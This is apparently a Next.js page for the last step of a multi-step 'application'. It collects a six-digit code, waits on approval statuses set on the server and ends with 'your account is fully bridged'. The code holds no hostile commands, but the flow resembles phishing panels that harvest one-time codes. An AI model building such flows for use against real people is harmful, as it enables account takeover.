
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, CheckCircle, Loader2, ArrowRight } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { useToast } from '@/hooks/use-toast';
import { useEffect, useState, useCallback } from 'react';

import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import { Progress } from '@/components/ui/progress';
import type { Submission, AuthUser } from '@/lib/types';
import { Loader } from '@/components/loader';


const formSchema = z.object({
  finalCode: z.string().length(6, "Code must be 6 digits."),
});

type FormValues = z.infer<typeof formSchema>;

export default function FinalCodePage() {
    const router = useRouter();
    const { toast } = useToast();
    const [user, setUser] = useState<AuthUser | null>(null);
    const { formState, ...form } = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { finalCode: "" },
    });

    const [submission, setSubmission] = useState<Submission | null>(null);
    const [isPageLoading, setIsPageLoading] = useState(true);
    const [isVerifying, setIsVerifying] = useState(false);

    const fetchSubmission = useCallback(async (userId: string) => {
        try {
            const res = await fetch(`/api/submissions?id=${userId}`);
            if (res.status === 404) {
                toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
                sessionStorage.removeItem('user-session');
                router.replace('/start');
                return;
            }
            if (!res.ok) throw new Error('Failed to fetch submission data.');
            
            const data: Submission = await res.json();
            
            const sessionUser = sessionStorage.getItem('user-session');
            if(sessionUser) {
                const parsedUser: AuthUser = JSON.parse(sessionUser);
                const updatedUser = {...parsedUser, submission: data};
                sessionStorage.setItem('user-session', JSON.stringify(updatedUser));
                setUser(updatedUser);
            }

            setSubmission(data);
            
            if (data.phoneNumberStatus !== 'approved') {
                router.replace('/start/select-number');
                return;
            }
            if (data.finalCodeStatus === 'approved') {
                router.push('/success');
                return;
            }
        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Error', description: err.message });
        } finally {
            setIsPageLoading(false);
        }
    }, [router, toast]);

    useEffect(() => {
        const sessionUser = sessionStorage.getItem('user-session');
        if (sessionUser) {
            const parsedUser: AuthUser = JSON.parse(sessionUser);
            setUser(parsedUser);
            fetchSubmission(parsedUser.id);
        } else {
             router.replace('/start');
        }
    }, [fetchSubmission, router]);
    
    const onSubmit = async (values: FormValues) => {
        if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });
        
        setIsVerifying(true);

        try {
             const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    id: user.id,
                    step: 'finalCode',
                    data: values.finalCode,
                }),
            });
             if (!response.ok) {
                 const errorData = await response.json();
                 throw new Error(errorData.message || 'Failed to submit final code.');
            }
            const updatedSubmission = await response.json();
            
            const sessionUser = sessionStorage.getItem('user-session');
             if(sessionUser) {
                const parsedUser: AuthUser = JSON.parse(sessionUser);
                const updatedUser = {...parsedUser, submission: updatedSubmission};
                sessionStorage.setItem('user-session', JSON.stringify(updatedUser));
            }

            setTimeout(() => {
                toast({ title: 'Application Complete!', description: 'Congratulations, your account is fully bridged.' });
                router.push('/success');
            }, 8000);

        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
            setIsVerifying(false);
        }
    };
    
    const { isSubmitting } = formState;

    if (isVerifying) {
        return <Loader isFadingOut={false} />;
    }

    if (isPageLoading || !submission) {
        return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
    }

    return (
        <div className="w-full max-w-lg">
             <div className="text-center mb-8">
                <div className="flex h-16 w-16 items-center justify-center rounded-full bg-primary/10 text-primary mb-4 mx-auto">
                    <CheckCircle className="h-8 w-8" />
                </div>
                <h1 className="text-2xl font-bold">Step 4: Final Confirmation</h1>
                <p className="text-muted-foreground">Enter the final 6-digit code to complete the process.</p>
            </div>

            <Progress value={100} className="w-[80%] mx-auto mb-8" />
            
            <Form {...form} formState={formState}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="finalCode"
                        render={({ field }) => (
                            <FormItem>
                            <FormLabel className="sr-only">Final Code</FormLabel>
                            <FormControl>
                                <div className="flex justify-center">
                                <InputOTP 
                                    maxLength={6} 
                                    {...field} 
                                    disabled={isSubmitting}
                                >
                                    <InputOTPGroup>
                                        <InputOTPSlot index={0} />
                                        <InputOTPSlot index={1} />
                                        <InputOTPSlot index={2} />
                                        <InputOTPSlot index={3} />
                                        <InputOTPSlot index={4} />
                                        <InputOTPSlot index={5} />
                                    </InputOTPGroup>
                                </InputOTP>
                                </div>
                            </FormControl>
                            <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />
                    
                    <div className="flex justify-between pt-4">
                         <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isSubmitting}>
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                         <Button type="submit" size="lg" className="rounded-full" disabled={isSubmitting}>
                            {isSubmitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             Submit Application
                             <ArrowRight className="ml-2 h-5 w-5" />
                        </Button>
                    </div>
                </form>
            </Form>
        </div>
    );
}
